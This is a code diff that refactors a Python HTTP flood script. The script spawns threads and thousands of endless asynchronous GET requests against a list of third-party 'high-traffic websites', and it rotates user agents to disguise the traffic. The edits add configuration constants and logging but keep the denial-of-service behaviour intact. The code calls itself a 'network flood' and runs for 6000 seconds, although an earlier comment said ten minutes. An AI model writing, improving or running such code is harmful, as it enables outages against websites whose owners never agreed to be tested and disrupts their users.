@@ -3,6 +3,12 @@ import time
 import aiohttp
 import asyncio
 import random
+import logging
+
+# Configuration parameters
+NUM_THREADS = 10
+NUM_REQUESTS = 1000
+DURATION = 6000  # seconds
 
 # List of high-traffic websites for testing
 urls = [
@@ -21,40 +27,38 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
 ]
 
+# Setup logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
 async def fetch(session, url):
     headers = {'User-Agent': random.choice(user_agents)}
     while True:
         try:
             async with session.get(url, headers=headers) as response:
                 await response.text()
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Error fetching {url}: {e}")
 
 async def start_flood(url):
     async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(1000):  # Increase the number of asynchronous requests
-            task = asyncio.create_task(fetch(session, url))
-            tasks.append(task)
+        tasks = [asyncio.create_task(fetch(session, url)) for _ in range(NUM_REQUESTS)]
         await asyncio.gather(*tasks)
 
 def network_stress():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    tasks = []
-    for url in urls:
-        tasks.append(loop.create_task(start_flood(url)))
+    tasks = [loop.create_task(start_flood(url)) for url in urls]
     loop.run_until_complete(asyncio.wait(tasks))
 
 if __name__ == "__main__":
-    # Start Network stress in multiple threads
     threads = []
-    for _ in range(10):  # Create 10 threads to run the async loop
+    for _ in range(NUM_THREADS):
         t = threading.Thread(target=network_stress)
         t.start()
         threads.append(t)
 
-    # Run the network flood for 10 minutes
-    time.sleep(6000)
+    # Run the network flood for the specified duration
+    time.sleep(DURATION)
     for t in threads:
         t.do_run = False
